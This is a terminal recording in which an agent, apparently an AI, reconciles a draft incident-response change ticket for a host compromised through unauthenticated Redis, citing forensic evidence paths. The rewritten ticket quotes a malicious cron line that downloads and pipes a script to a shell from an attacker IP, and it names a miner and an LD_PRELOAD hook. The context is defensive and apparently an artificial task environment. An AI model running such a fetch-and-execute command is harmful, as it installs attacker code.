[105.321294, "o", "{\r\n  \"$schema\": \"http://json-schema.org/draft-07/schema#\",\r\n  \"title\": \"finding\",\r\n  \"type\": \"object\",\r\n  \"required\": [\r\n    \"chk\",\r\n    \"path\",\r\n    \"attck\",\r\n    \"confidence\",\r\n    \"evidence\"\r\n  ],\r\n  \"properties\": {\r\n    \"chk\": {\r\n      \"type\": \"string\"\r\n    },\r\n    \"path\": {\r\n      \"type\": \"string\"\r\n    },\r\n    \"attck\": {\r\n      \"type\": \"string\",\r\n      \"pattern\": \"^T\\\\d{4}(\\\\.\\\\d{3})?$\"\r\n    },\r\n    \"confidence\": {\r\n      \"enum\": [\r\n        \"low\",\r\n        \"medium\",\r\n        \"high\"\r\n      ]\r\n    },\r\n    \"evidence\": {\r\n      \"type\": \"string\",\r\n      \"description\": \"backtick-cited /disk or /sas path\"\r\n    }\r\n  }\r\n}\r\n"]
[105.321352, "o", "\u001b[?2004hroot@43839b8f6af0:/app# "]
[105.321527, "o", "echo \"---\"\r\n\u001b[?2004l\r---\r\n\u001b[?2004hroot@43839b8f6af0:/app# cat /sas/handoff/change-ticket.md\r\n\u001b[?2004l\r"]
[105.322026, "o", "# CHANGE TICKET  CHG-5677  (DRAFT — reconcile against your findings)\r\n\r\n> A previous shift pre-filled this remediation ticket from the SAS alerts ALONE. It is known\r\n> to be incomplete and contains stale/incorrect lines. Correct it IN PLACE against your own\r\n> investigation of /disk; cite evidence for every change. Do not author from scratch.\r\n\r\n| # | Action | Target | Status | Note |\r\n|---|--------|--------|--------|------|\r\n| 1 | Block source IP inbound | 203.0.113.9 | proposed | STALE: prior shift used the wrong IP; confirm the real origin from /disk |\r\n| 2 | Patch CVE-2019-0708 (BlueKeep) | RDP | proposed | WRONG: not the entry vector for this host — verify against /sas/cti |\r\n| 3 | Remove cron miner | /var/spool/cron/root | DONE | UNVERIFIED: marked done with no evidence — re-check |\r\n| 4 | (add) silent persistence you discover | /etc/ld.so.preload | TODO | ticket omits everything not alerted — add the rest |\r\n\r\n## Reviewer checklist\r\n- [ ] Every action maps to a cited artifact under /disk or /sas\r\n- [ ] Fix the wrong IP (row 1) and wrong CVE (row 2)\r\n- [ ] Downgrade row 3 from DONE to VERIFIED-or-OPEN with evidence\r\n- [ ] Add the silent (non-alerted) artifacts the prior shift missed\r\n\u001b[?2004hroot@43839b8f6af0:/app# "]
[125.393363, "i", "cat << 'EOF' > /sas/handoff/change-ticket.md\n# CHANGE TICKET CHG-5677 (RECONCILED)\n\n> Reconciled against forensic findings in `/disk` and SAS alert feed in `/sas`.\n\n| # | Action | Target | Status | Note |\n|---|--------|--------|--------|------|\n| 1 | Block source IP inbound | 198.51.100.170 | PROPOSED | Updated IP from `203.0.113.9` to `198.51.100.170` based on `/sas/cti/advisory.txt:6`, `/disk/var/lib/.cache/.wiped.bin:1`, and `/disk/var/spool/cron/crontabs/root:5`. |\n| 2 | Harden Redis configuration | /etc/redis/redis.conf | PROPOSED | Replaced irrelevant BlueKeep/RDP action. Entry vector was unauthenticated Redis bound to 0.0.0.0 (`/disk/etc/redis/redis.conf:3`). |\n| 3 | Remove cron miner & beacon | /var/spool/cron/crontabs/root | OPEN | Downgraded from DONE to OPEN as malicious cron job `curl hxxp://198.51.100.170/x | sh` is still present in `/disk/var/spool/cron/crontabs/root:5`. |\n| 4 | Quarantine LD_PRELOAD hook | /etc/ld.so.preload | TODO | Unalerted silent persistence hook referencing `/lib/.hide.so` found in `/disk/etc/ld.so.preload:1`. |\n| 5 | Quarantine miner binary & directory | /tmp/.redis/kdevtmpfsi | TODO | Cryptominer binary staged under `/tmp/.redis/` as seen in `/disk/tmp/.redis/kdevtmpfsi:1` and `/sas/alerts.json:2`. |\n| 6 | Quarantine malicious module sample | /tmp/.redis/exp.so | TODO | Unalerted staged exploit module found in `/disk/tmp/.redis/exp.so:1`. |\n\n## Reviewer checklist\n- [x] Every action maps to a cited artifact under /disk or /sas\n- [x] Fix the wrong IP (row 1) and wrong CVE (row 2)\n- [x] Downgrade row 3 from DONE to VERIFIED-or-OPEN with evidence\n- [x] Add the silent (non-alerted) artifacts the prior shift missed\nEOF\n"]
[125.393872, "o", "cat << 'EOF' > /sas/handoff/change-ticket.md"]
